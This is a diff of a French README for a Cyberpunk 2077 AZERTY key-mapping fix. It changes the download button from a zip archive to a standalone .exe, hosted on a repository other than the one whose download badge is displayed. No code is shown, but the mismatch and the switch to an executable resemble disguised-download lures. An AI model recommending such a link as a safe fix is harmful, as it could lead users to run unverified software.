@@ -28,6 +28,6 @@ Si jamais vous souhaitez restaurer votre ancien mapping, il est toujours possibl
 5. DANS LES PARAMÈTRES DU JEU, ALLER DANS '**RACCOURCIS CLAVIER'**, APPUYEZ SUR LE BOUTON '**PAR DÉFAUT**' ET APPUYEZ SUR '**APPLIQUER'**.
 6. ENJOY ! 😄
 
-[![Download here](https://img.shields.io/github/downloads/40nyx/Cyberpunk-2077-mapping-AZERTY-FIX/total?style=for-the-badge)](https://github.com/SAWKIT-17/Cyberpunk-2077-AZERTY-Patch/releases/download/v2.0/patch.zip)
+[![Download here](https://img.shields.io/github/downloads/40nyx/Cyberpunk-2077-mapping-AZERTY-FIX/total?style=for-the-badge)](https://github.com/SAWKIT-17/Cyberpunk-2077-AZERTY-Patch/releases/download/2.1/cp2077_azerty.exe)
 
 ![](https://i.giphy.com/media/qWi6NKfkrt9TgXvIfg/giphy.webp)
